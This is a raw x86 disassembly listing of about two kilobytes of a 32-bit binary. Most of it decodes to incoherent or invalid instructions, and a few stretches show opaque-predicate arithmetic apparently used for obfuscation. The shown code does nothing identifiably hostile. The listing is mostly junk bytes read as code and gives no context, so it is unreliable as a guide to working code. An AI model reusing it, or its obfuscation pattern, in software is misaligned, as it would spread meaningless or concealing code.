  404193:	in     eax,0xfe
  404195:	int3   
  404196:	pop    es
  404197:	stos   DWORD PTR es:[edi],eax
  404198:	fld    DWORD PTR [ecx-0xb1a7459]
  40419e:	out    0x8a,eax
  4041a0:	push   0x20
  4041a2:	ins    DWORD PTR es:[edi],dx
  4041a3:	push   cs
  4041a4:	jb     0x4041d0
  4041a6:	adc    DWORD PTR [edx-0x69],esi
  4041a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041aa:	int    0xb6
  4041ac:	imul   esp,DWORD PTR [edi+edx*4],0x61
  4041b0:	in     al,dx
  4041b1:	out    0x68,al
  4041b3:	fbstp  TBYTE PTR [ebx]
  4041b5:	shl    DWORD PTR ds:0x903e64a1,1
  4041bb:	mov    esp,0x4bf5bc1f
  4041c0:	je     0x404145
  4041c2:	stos   DWORD PTR es:[edi],eax
  4041c3:	int3   
  4041c4:	add    BYTE PTR [ebp-0x59],ah
  4041c7:	retf   0xaf8e
  4041ca:	sub    ebx,0x34276cf5
  4041d0:	mov    al,0x8e
  4041d2:	mov    es,ecx
  4041d4:	mov    eax,ds:0x94380a75
  4041d9:	fsubr  QWORD PTR [edx]
  4041db:	jle    0x4041c7
  4041dd:	pop    edi
  4041de:	mov    cl,0xe4
  4041e0:	pop    eax
  4041e1:	or     BYTE PTR [ebx+0x2df9de7],cl
  4041e7:	mov    BYTE PTR [esi-0x1b4c8f00],cl
  4041ed:	das    
  4041ee:	mov    ah,0x5d
  4041f0:	cli    
  4041f1:	inc    ebx
  4041f2:	or     al,0xe
  4041f4:	jge    0x4041cb
  4041f6:	jge    0x40426c
  4041f8:	pop    es
  4041f9:	pop    edi
  4041fa:	add    DWORD PTR [ebx+0x3cdacc32],ebx
  404200:	in     eax,dx
  404201:	and    BYTE PTR [eax+0x5b3ce671],cl
  404207:	mov    ebp,0xea5b76f1
  40420c:	sub    al,0x49
  40420e:	fcmovb st,st(2)
  404210:	out    0x5e,al
  404212:	hlt    
  404213:	jnp    0x404277
  404215:	adc    BYTE PTR [ecx],bh
  404217:	mov    ebp,0xbcd96ae0
  40421c:	mov    dl,0x7b
  40421e:	jne    0x404268
  404220:	jno    0x404221
  404222:	xchg   esi,eax
  404223:	(bad)  
  404225:	(bad)  
  404226:	es loopne 0x404299
  404229:	icebp  
  40422a:	aam    0x50
  40422c:	cs dec edi
  40422e:	les    ebp,FWORD PTR [edi+0x1d907df9]
  404234:	dec    edi
  404235:	jl     0x404289
  404237:	mov    ah,0x9b
  404239:	aad    0xd1
  40423b:	imul   BYTE PTR [esi-0x7ff21a80]
  404241:	gs pop ebx
  404243:	(bad)  
  404244:	push   esp
  404245:	xlat   BYTE PTR ds:[ebx]
  404246:	add    eax,0xab717275
  40424b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	out    dx,eax
  404262:	inc    ebx
  404263:	loopne 0x404244
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042e4
  40426e:	xchg   edi,eax
  40426f:	(bad)  
  404271:	xchg   esi,eax
  404272:	les    ecx,FWORD PTR [esi-0x6d]
  404275:	and    DWORD PTR [eax],ecx
  404277:	mov    al,ds:0xf0a02727
  40427c:	pop    eax
  40427d:	cmp    ch,bl
  40427f:	int    0x2a
  404281:	int    0x90
  404283:	je     0x404301
  404285:	push   edx
  404286:	adc    al,0xbb
  404288:	lods   al,BYTE PTR ds:[esi]
  404289:	sub    BYTE PTR [ebx+0x78acf74b],0xf6
  404290:	push   edi
  404291:	xor    BYTE PTR [ecx+0x5e69a255],bh
  404297:	jmp    0xc3d7:0x888e62c9
  40429e:	cmp    eax,0x5aac1392
  4042a3:	adc    edx,DWORD PTR [edx+0x31f2a6ee]
  4042a9:	pop    ecx
  4042aa:	ss push edi
  4042ac:	ret    
  4042ad:	push   ds
  4042ae:	pop    ebp
  4042af:	cmp    BYTE PTR [eax-0x45276ebb],al
  4042b5:	dec    esi
  4042b6:	mov    edx,ss
  4042b8:	rol    DWORD PTR [ebx],1
  4042ba:	into   
  4042bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042bc:	jb     0x404292
  4042be:	sahf   
  4042bf:	fisub  WORD PTR [edx+0x15e6185c]
  4042c5:	ds push ebx
  4042c7:	xchg   edi,eax
  4042c8:	popa   
  4042c9:	mov    cl,0x3f
  4042cb:	push   edi
  4042cd:	ins    DWORD PTR es:[edi],dx
  4042ce:	jae    0x404323
  4042d0:	fcom   DWORD PTR ds:0xf1a85406
  4042d6:	ins    DWORD PTR es:[edi],dx
  4042d7:	fninit 
  4042d9:	iret   
  4042da:	fnstenv [ebx-0x71bcf09e]
  4042e0:	sub    ecx,DWORD PTR [edx-0x62]
  4042e3:	sbb    BYTE PTR [eax],cl
  4042e5:	pushf  
  4042e6:	or     ch,BYTE PTR [ecx+eax*1-0x36c7c426]
  4042ed:	inc    esi
  4042ee:	pop    ds
  4042ef:	sub    eax,0x58d5bf98
  4042f4:	mov    DWORD PTR [eax-0x3eb14bd9],eax
  4042fa:	mov    BYTE PTR [ecx],bl
  4042fc:	fstp   DWORD PTR [edi+ecx*4]
  4042ff:	test   DWORD PTR [edx],esi
  404301:	cld    
  404302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404303:	cmp    ch,BYTE PTR [edx]
  404305:	les    eax,FWORD PTR [ebx+0x3c]
  404308:	test   BYTE PTR [edi+0x4161dac9],dl
  40430e:	inc    esp
  40430f:	mov    ah,0x76
  404311:	icebp  
  404312:	sbb    BYTE PTR [ecx+0x65187010],ah
  404318:	xor    DWORD PTR [ebx+0x738a4572],edi
  40431e:	mov    ah,0xd5
  404320:	ret    
  404321:	or     edx,esp
  404323:	icebp  
  404324:	sti    
  404325:	pushf  
  404326:	ds je  0x40435d
  404329:	out    dx,al
  40432a:	cmp    al,0x5
  40432c:	pop    DWORD PTR [eax+0x60bbe8cf]
  404332:	xchg   BYTE PTR [eax+0xd],ah
  404335:	sub    BYTE PTR [ebx-0x56],ah
  404338:	mov    edx,0xe1855f9b
  40433d:	or     edi,DWORD PTR [eax]
  40433f:	xchg   BYTE PTR [eax],bl
  404341:	mov    ecx,0xd6f6ac69
  404346:	stos   DWORD PTR es:[edi],eax
  404347:	imul   edx,DWORD PTR [edi-0x6a080d2f],0x70af1a7f
  404351:	inc    ecx
  404352:	loopne 0x4042e9
  404354:	rcl    BYTE PTR ds:0xb0b01748,0xd2
  40435b:	jmp    0x404308
  40435d:	scas   al,BYTE PTR es:[edi]
  40435e:	xchg   edx,eax
  40435f:	or     eax,0x31d009c6
  404364:	jmp    0xd0ab:0x9621aeb5
  40436b:	jb     0x404312
  40436d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436e:	(bad)  
  40436f:	push   edi
  404370:	push   es
  404371:	popa   
  404372:	(bad)  
  404373:	mov    eax,ds:0x9b94f303
  404378:	xchg   ecx,eax
  404379:	call   0x9619177d
  40437e:	jmp    0x71fb6463
  404383:	data16 sbb al,0xb9
  404386:	xchg   ebx,eax
  404387:	adc    edi,esp
  404389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438a:	fwait
  40438b:	inc    edx
  40438c:	mov    dh,0x29
  40438e:	arpl   WORD PTR ds:0x4555619f,di
  404394:	pop    ebp
  404395:	lahf   
  404396:	enter  0x6821,0xa
  40439a:	xor    eax,0x140c1412
  40439f:	cmp    dl,BYTE PTR [edi-0x7b]
  4043a2:	jg     0x404408
  4043a4:	ds fisubr WORD PTR ss:[edi]
  4043a8:	jmp    0x526ff6c7
  4043ad:	retf   0xcf70
  4043b0:	bound  edx,QWORD PTR [esi+0x25f00e3c]
  4043b6:	and    dh,ah
  4043b8:	xor    al,0x22
  4043ba:	pop    esp
  4043bb:	arpl   WORD PTR [eax-0x163adf40],ax
  4043c1:	inc    eax
  4043c2:	fwait
  4043c3:	nop
  4043c4:	clc    
  4043c5:	cmp    ah,bl
  4043c7:	sub    DWORD PTR [ecx*4-0x2c7c790d],eax
  4043ce:	call   0x82b7:0xeaf832c0
  4043d5:	sbb    al,0xc2
  4043d7:	pop    ds
  4043d8:	mov    BYTE PTR [eax+0x5],0x15
  4043dc:	icebp  
  4043dd:	sahf   
  4043de:	in     al,0xdf
  4043e0:	and    eax,0xe2a17698
  4043e5:	(bad)  
  4043e6:	sub    eax,0xf76d46b8
  4043eb:	mov    edx,0x340163c0
  4043f0:	into   
  4043f1:	sub    ecx,DWORD PTR [esi+eiz*8-0x6bf5771d]
  4043f8:	jmp    0x40439c
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xb82c52df,al
  40444e:	and    BYTE PTR [edx+0x17],bh
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404413
  404458:	jo     0x4043f0
  40445a:	xchg   BYTE PTR [ecx-0x4b38b870],al
  404460:	push   dx
  404462:	inc    eax
  404463:	jle    0x40447b
  404465:	ss push ss
  404467:	ins    BYTE PTR es:[edi],dx
  404468:	and    bl,BYTE PTR [ebp+0x556f7fbc]
  40446e:	stos   DWORD PTR es:[edi],eax
  40446f:	jle    0x404470
  404471:	inc    esi
  404472:	pop    esp
  404473:	fcomp  DWORD PTR [esi-0x6f]
  404476:	cmp    eax,0x99fe8a98
  40447b:	add    dl,BYTE PTR [edx+0x9]
  40447e:	xchg   ebp,eax
  40447f:	nop
  404480:	adc    al,0xe2
  404482:	pop    ds
  404483:	add    dl,al
  404485:	mov    edx,0xedd14003
  40448a:	iret   
  40448b:	inc    esp
  40448c:	xchg   esp,eax
  40448d:	sub    esi,edi
  40448f:	adc    BYTE PTR [edi+0x442f041],cl
  404495:	rcr    DWORD PTR [edi-0x76],0x90
  404499:	jbe    0x4044ba
  40449b:	xor    DWORD PTR [eax+0x712df3f1],ebx
  4044a1:	pop    ecx
  4044a2:	out    dx,al
  4044a3:	pop    edi
  4044a4:	ret    0xe06
  4044a7:	adc    al,0xbf
  4044a9:	stc    
  4044aa:	mov    esp,0x2206b52d
  4044af:	and    DWORD PTR [ecx+eiz*8],0xffffffdb
  4044b3:	mov    eax,0xc31d4944
  4044b8:	nop
  4044b9:	xchg   esi,eax
  4044ba:	push   edi
  4044bb:	mov    ch,0xbe
  4044bd:	fadd   DWORD PTR [esi+0x12]
  4044c0:	sub    al,0x80
  4044c2:	aad    0x66
  4044c4:	loope  0x404503
  4044c6:	dec    edx
  4044c7:	cmc    
  4044c8:	inc    esi
  4044c9:	mov    eax,ds:0x67cabae6
  4044ce:	pop    ds
  4044cf:	call   0x5f4b:0x130b06c8
  4044d6:	mov    ch,0x15
  4044d8:	push   es
  4044d9:	std    
  4044da:	sar    DWORD PTR [edi-0x2c],0xd
  4044de:	xor    al,0x38
  4044e0:	dec    esi
  4044e1:	pushf  
  4044e2:	jae    0x4044c1
  4044e4:	cmp    ebx,DWORD PTR [edx-0x66ee6ec9]
  4044ea:	in     eax,0x16
  4044ec:	xor    eax,0x56aba49c
  4044f1:	mov    eax,0x432ae397
  4044f6:	int3   
  4044f7:	out    dx,eax
  4044f8:	push   ebp
  4044f9:	push   ds
  4044fa:	adc    WORD PTR [eax],sp
  4044fd:	jge    0x40453f
  4044ff:	leave  
  404500:	pop    esp
  404501:	clc    
  404502:	popa   
  404503:	push   ebp
  404504:	and    eax,0xffaa85a7
  404509:	inc    edi
  40450a:	xlat   BYTE PTR ds:[ebx]
  40450b:	(bad)  
  40450c:	shl    DWORD PTR [ebx+0x578ff567],0x11
  404513:	adc    DWORD PTR [ebx],0x9
  404516:	and    dl,BYTE PTR [ebp-0x48]
  404519:	rcl    al,cl
  40451b:	adc    eax,0x1318c430
  404520:	mov    WORD PTR [ecx-0x3376e023],fs
  404526:	ret    
  404527:	lods   eax,DWORD PTR ds:[esi]
  404528:	and    BYTE PTR [esi+0x3331bff1],0x15
  40452f:	sub    dl,BYTE PTR [esi]
  404531:	aas    
  404532:	inc    ebx
  404533:	stos   DWORD PTR es:[edi],eax
  404534:	imul   esi,DWORD PTR [ebx],0xffffffa6
  404537:	in     eax,dx
  404538:	call   0x82b5:0x17f84ea3
  40453f:	sbb    eax,0x13b8d203
  404544:	add    al,0x65
  404546:	call   0xbe7f:0x1015e063
  40454d:	imul   edx,DWORD PTR [edi+0x4a],0xffffff89
  404551:	out    0xad,al
  404553:	and    al,0x14
  404555:	adc    ah,0x7f
  404558:	mov    ah,0x9e
  40455a:	sub    eax,0x73a1dc88
  40455f:	mov    edi,0xe0d00c72
  404564:	jle    0x4045de
  404566:	stos   DWORD PTR es:[edi],eax
  404567:	clc    
  404568:	mov    al,ds:0x1a4140e1
  40456d:	icebp  
  40456e:	retf   0xc03b
  404571:	outs   dx,BYTE PTR ds:[esi]
  404572:	jae    0x4045ae
  404574:	iret   
  404575:	jae    0x404524
  404577:	inc    edi
  404578:	and    eax,0x1e4aabd0
  40457d:	jno    0x404526
  40457f:	and    ebx,0x778b71b2
  404585:	inc    ebx
  404586:	shr    edi,0x58
  404589:	mov    ebp,0xdb9815e0
  40458e:	test   BYTE PTR [esi+0x6f],bl
  404591:	jmp    0xe73:0x85ef0077
  404598:	or     DWORD PTR [eax],edx
  40459a:	add    al,0xbd
  40459c:	mov    ?,ebx
  40459e:	pop    ecx
  40459f:	(bad)  
  4045a0:	fldenv [edi]
  4045a2:	dec    edx
  4045a3:	nop
  4045a4:	push   edx
  4045a5:	arpl   WORD PTR [ecx],ax
  4045a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a8:	fmul   st,st(0)
  4045aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ab:	and    DWORD PTR [esi+0x79],edi
  4045ae:	cmc    
  4045af:	cmp    al,0xaa
  4045b1:	pop    ebp
  4045b2:	test   DWORD PTR [edi-0x448414a],esi
  4045b8:	sbb    eax,0x4bb5aa24
  4045bd:	(bad)  
  4045be:	sub    eax,0x4ae32041
  4045c3:	adc    bl,BYTE PTR cs:0xf676ed1c
  4045ca:	ss test al,0xd
  4045cd:	xchg   DWORD PTR [ebx+edi*4-0x79abbb88],ebx
  4045d4:	jb     0x4045f0
  4045d6:	shr    BYTE PTR [eax-0x47],0xe0
  4045da:	dec    ebp
  4045db:	ins    DWORD PTR es:[edi],dx
  4045dc:	pusha  
  4045dd:	imul   ebx,ebx,0x126ec9d5
  4045e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e4:	mov    edx,DWORD PTR [ebp-0x34]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx+0x7a35bf30],al
  40466a:	lods   al,BYTE PTR ds:[esi]
  40466b:	mov    al,0xf7
  40466d:	sub    DWORD PTR [esi+0x7e],edi
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x404605
  404675:	enter  0x8215,0x66
  404679:	pop    esp
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	xor    eax,0xfee71196
  404680:	jmp    0x25a6:0x341ab8d8
  404687:	ja     0x4046c2
  404689:	in     al,0xc0
  40468b:	or     BYTE PTR [edi],cl
  40468d:	(bad)  
  40468e:	(bad)  
  404690:	xchg   ebx,eax
  404691:	imul   edx,DWORD PTR [edx-0x33e675a0],0x6f121b65
  40469b:	outs   dx,BYTE PTR ds:[esi]
  40469c:	mov    eax,0x526106f1
  4046a1:	xchg   DWORD PTR [edx],ecx
  4046a3:	jl     0x40466b
  4046a5:	sub    dh,BYTE PTR [esi-0x71b552be]
  4046ab:	aaa    
  4046ac:	scas   al,BYTE PTR es:[edi]
  4046ad:	dec    edi
  4046ae:	xchg   ebp,eax
  4046af:	mov    eax,ds:0x6cc40aa
  4046b4:	push   ebp
  4046b5:	imul   ebx,ebp,0xe200d62e
  4046bb:	stc    
  4046bc:	jae    0x40469c
  4046be:	jmp    0xb3c699d1
  4046c3:	(bad)  
  4046c4:	xchg   ebp,eax
  4046c5:	lods   eax,DWORD PTR ds:[esi]
  4046c6:	in     al,dx
  4046c7:	pushf  
  4046c8:	lea    esi,[ebp+0x2b]
  4046cb:	xor    esi,DWORD PTR [ecx*1-0xd3f9e99]
  4046d2:	aad    0x3f
  4046d4:	outs   dx,DWORD PTR cs:[esi]
  4046d6:	xlat   BYTE PTR ds:[ebx]
  4046d7:	adc    DWORD PTR [edi-0x8],eax
  4046da:	icebp  
  4046db:	sbb    al,0x63
  4046dd:	stos   BYTE PTR es:[edi],al
  4046de:	(bad)  
  4046e0:	fwait
  4046e1:	mov    ebp,0xba1ec552
  4046e6:	add    DWORD PTR [eax+eiz*4+0x6c83aa95],ecx
  4046ed:	pop    esp
  4046ee:	sub    BYTE PTR ds:0xb1180958,ah
  4046f4:	mov    ah,0x64
  4046f6:	xchg   edx,eax
  4046f7:	inc    esp
  4046f8:	inc    ecx
  4046f9:	test   dl,dh
  4046fb:	js     0x4046e0
  4046fd:	icebp  
  4046fe:	ror    DWORD PTR [esi],1
  404700:	mov    eax,ds:0x4f545057
  404705:	into   
  404706:	and    DWORD PTR [eax],ebx
  404708:	xchg   ebp,eax
  404709:	xchg   DWORD PTR [edx],esp
  40470b:	mov    edi,0x9e563d16
  404710:	loop   0x4046b4
  404712:	fsubr  st(3),st
  404714:	js     0x404702
  404716:	loop   0x40476f
  404718:	dec    esi
  404719:	and    ch,BYTE PTR [ebx]
  40471b:	xor    BYTE PTR [ebx-0x74342175],ch
  404721:	(bad)  
  404722:	imul   ebp,esp,0x19
  404725:	popf   
  404726:	dec    edi
  404727:	push   0x90df6ebe
  40472c:	mov    ch,0xb5
  40472e:	lock stc 
  404730:	test   DWORD PTR [eax],esi
  404732:	iret   
  404733:	icebp  
  404734:	inc    ecx
  404735:	adc    dl,dl
  404737:	lods   al,BYTE PTR ds:[esi]
  404738:	mov    bh,0x9e
  40473a:	lea    edi,ds:0x892d85d7
  404740:	jle    0x40474c
  404742:	add    al,0x91
  404744:	add    al,0x3f
  404746:	test   BYTE PTR [ebp-0x46b07a8a],al
  40474c:	xchg   esi,eax
  40474d:	test   BYTE PTR [ecx-0x1b],0xa6
  404751:	sub    al,0x6b
  404753:	aas    
  404754:	lds    esp,FWORD PTR [edi]
  404756:	push   ds
  404757:	fild   WORD PTR [ecx+ebx*2]
  40475a:	test   eax,0x972e1ab1
  40475f:	lss    eax,FWORD PTR [ebp+0x751c920d]
  404766:	stc    
  404767:	rcr    DWORD PTR [eax+0x7513080d],1
  40476d:	push   es
  40476e:	in     al,0x25
  404770:	cmp    DWORD PTR [eax+edi*1+0x248abaf4],esi
  404777:	pop    ecx
  404778:	or     bl,BYTE PTR [ecx+0x23e92616]
  40477e:	aad    0x84
  404780:	int3   
  404781:	stos   BYTE PTR es:[edi],al
  404782:	adc    bl,BYTE PTR [ebx+0x71]
  404785:	mov    bh,0x5e
  404787:	add    al,0xc8
  404789:	mov    gs,WORD PTR [ebx-0x37491e95]
  40478f:	adc    al,0x86
  404791:	out    dx,al
  404792:	or     al,0x14
  404794:	jle    0x40476a
  404796:	xor    ecx,DWORD PTR [eax+0x3b5e8658]
  40479c:	hlt    
  40479d:	sbb    al,0xd6
  40479f:	lahf   
  4047a0:	je     0x404752
  4047a2:	pop    esp
  4047a3:	fisub  DWORD PTR [ebp-0x66]
  4047a6:	add    eax,0xaf87082
  4047ab:	mov    esi,0x64d1a9cb
  4047b0:	test   DWORD PTR [ecx+edi*2+0x58],edi
  4047b4:	cld    
  4047b5:	pop    ebp
  4047b6:	push   edi
  4047b7:	sar    BYTE PTR [edi],1
  4047b9:	add    ebx,esi
  4047bb:	icebp  
  4047bc:	aam    0xcb
  4047be:	lds    ebx,FWORD PTR [ecx-0x7959c025]
  4047c4:	push   cs
  4047c5:	pop    ebp
  4047c6:	mov    BYTE PTR [ebp+0x35],bh
  4047c9:	fidiv  DWORD PTR [edi+0x65c87fe6]
  4047cf:	ret    
  4047d0:	or     al,0xad
  4047d2:	xchg   edi,eax
  4047d3:	mov    bl,0x98
  4047d5:	push   cx
  4047d7:	pusha  
  4047d8:	lds    edi,FWORD PTR [esi-0x18]
  4047db:	sbb    esp,ecx
  4047dd:	push   ds
  4047de:	jae    0x404783
  4047e0:	dec    edx
  4047e2:	push   ebx
  4047e3:	inc    esp
  4047e4:	or     DWORD PTR [ecx],esi
  4047e6:	adc    eax,0x6bd7c880
  4047eb:	fs pop ecx
  4047ed:	pop    ebx
  4047ee:	and    BYTE PTR [edi-0x2db7c7c],dh
  4047f4:	mov    WORD PTR [esi+esi*2+0x4c63b8d9],ss
  4047fb:	cdq    
  4047fc:	bnd jp 0x4047b0
  4047ff:	xor    BYTE PTR [ebx+0x5503d033],dh
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x49d9f0ba],0xfffe
  40482a:	push   0x7e7e2b04
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x4047f2
  404834:	and    al,0xa6
  404836:	cmp    BYTE PTR [ebx-0x3a2071bf],0xe3
  40483d:	ficom  WORD PTR [ecx-0x61]
  404840:	mov    cl,0x56
  404842:	pop    ds
  404843:	rcl    DWORD PTR [edx],0xf9
  404846:	outs   dx,BYTE PTR ds:[esi]
  404847:	sbb    DWORD PTR [edx-0x17],eax
  40484a:	into   
  40484b:	sbb    eax,0xe7073f49
  404850:	nop
  404851:	and    eax,ebp
  404853:	sbb    cl,cl
  404855:	call   0x3bd85509
  40485a:	jle    0x404810
  40485c:	imul   esi,DWORD PTR [eax],0xc20c6baa
  404862:	pop    ebx
  404863:	mov    esp,0x6092c80f
  404868:	cmp    bl,bl
  40486a:	add    BYTE PTR ss:[eax-0x62a18213],0xb9
  404872:	cmp    dl,BYTE PTR fs:[eax+ebx*4+0x3a336403]
  40487a:	mov    esi,0x1210bda8
  40487f:	and    esp,eax
  404881:	adc    DWORD PTR [esi+0x2c],0xffffff9f
  404885:	loopne 0x4048f3
  404887:	jmp    0xe97b5c2d
  40488c:	loop   0x404827
  40488e:	nop
  40488f:	enter  0xf462,0x96
  404893:	add    al,BYTE PTR [esi]
  404895:	pop    eax
  404896:	push   eax
  404897:	push   cs
  404898:	fldlg2 
  40489a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40489b:	push   eax
  40489c:	cwde   
  40489d:	mov    edx,0x74a00c79
  4048a2:	les    edi,FWORD PTR [eax]
  4048a4:	inc    edi
  4048a5:	or     al,0x9a
  4048a7:	xlat   BYTE PTR ds:[ebx]
  4048a8:	stos   DWORD PTR es:[edi],eax
  4048a9:	in     al,0x43
  4048ab:	in     al,0x47
  4048ad:	lahf   
  4048ae:	fiadd  DWORD PTR [eax-0x77]
  4048b1:	or     cl,BYTE PTR [edi-0x36]
  4048b4:	(bad)  
  4048b5:	enter  0x6403,0x89
  4048b9:	xor    cl,BYTE PTR [esi]
  4048bb:	js     0x404848
  4048bd:	popf   
  4048be:	push   DWORD PTR [esi-0x742fa1b9]
  4048c4:	fst    QWORD PTR ds:0xba7599a8
  4048ca:	jno    0x4048a3
  4048cc:	or     dl,BYTE PTR [edx+0x8]
  4048cf:	int    0xf0
  4048d1:	cs and eax,0x8595fdf4
  4048d7:	sub    cl,BYTE PTR [eax+0x2e]
  4048da:	xor    BYTE PTR [ebx],dl
  4048dc:	add    DWORD PTR [ebp+ecx*8-0x5],ebp
  4048e0:	jnp    0x404882
  4048e2:	dec    ebx
  4048e4:	pusha  
  4048e5:	mov    DWORD PTR [edi],ecx
  4048e7:	xor    eax,0x7fc5fede
  4048ec:	shr    edx,cl
  4048ee:	int    0xd9
  4048f0:	and    DWORD PTR [edi-0x2c655adb],ecx
  4048f6:	add    bh,ah
  4048f8:	loope  0x404910
  4048fa:	push   esi
  4048fb:	cmc    
  4048fc:	jno    0x4048b4
  4048fe:	inc    eax
  4048ff:	mov    bh,BYTE PTR [ecx-0x4c]
  404902:	dec    ebx
  404903:	sub    eax,0x8d032553
  404908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404909:	gs push eax
  40490b:	fs xchg esi,eax
  40490d:	jbe    0x40492e
  40490f:	xor    DWORD PTR [eax+0x2f],edi
  404912:	dec    edi
  404913:	(bad)  
  404914:	fwait
  404915:	(bad)  
  404916:	loop   0x40494a
  404918:	loopne 0x4048c0
  40491a:	mov    cl,0x78
  40491c:	jp     0x404991
  40491e:	lds    esp,FWORD PTR ds:0xa3827a8a
  404924:	xor    cl,bl
  404926:	jbe    0x40499d
  404928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404929:	das    
  40492a:	or     DWORD PTR [ebx-0x11],eax
  40492d:	mov    ds:0x19cad9f4,al
  404932:	ins    BYTE PTR es:[edi],dx
  404933:	push   cs
  404934:	loope  0x40497a
  404936:	adc    DWORD PTR [ecx-0x1],ebx
  404939:	iret   
  40493a:	and    edx,ebp
  40493c:	xor    al,0x9
  40493e:	aad    0x2
  404940:	test   ch,cl
  404942:	retf   0x2e36
  404945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404946:	hlt    
  404947:	stos   BYTE PTR es:[edi],al
  404948:	xor    DWORD PTR ds:[eax-0x63],0x6d
  40494d:	shr    BYTE PTR [esp+edx*2+0x959b0e9],cl
  404954:	int3   
  404955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404956:	add    al,0x14
  404958:	mov    ch,0x77
  40495a:	sub    DWORD PTR [edx],edx
  40495c:	(bad)  
  40495d:	jns    0x404946
  40495f:	lahf   
  404960:	sub    bl,cl
  404962:	xchg   DWORD PTR [edi+eax*4],ebp
  404965:	shl    eax,cl
  404967:	test   DWORD PTR [eax+0xa],0x2f60038d
  40496e:	push   cs
  40496f:	int3   
  404970:	xchg   ebx,eax
  404971:	or     DWORD PTR [edx+0x5936185d],edi
  404977:	mov    ch,0x3
  404979:	push   0xbdcbd710
  40497e:	mov    DWORD PTR [edi],ebx
  404980:	jno    0x404972
  404982:	(bad)  
  404983:	scas   al,BYTE PTR es:[edi]
  404984:	sub    ebx,DWORD PTR [edi-0x3a8683c5]
  40498a:	push   edx
  40498b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40498c:	mov    ebx,0xfcfc779a
  404991:	add    dl,ch
  404993:	push   edi
  404994:	cmp    eax,eax
  404996:	(bad)  
  404997:	mov    esp,0xf3440f24
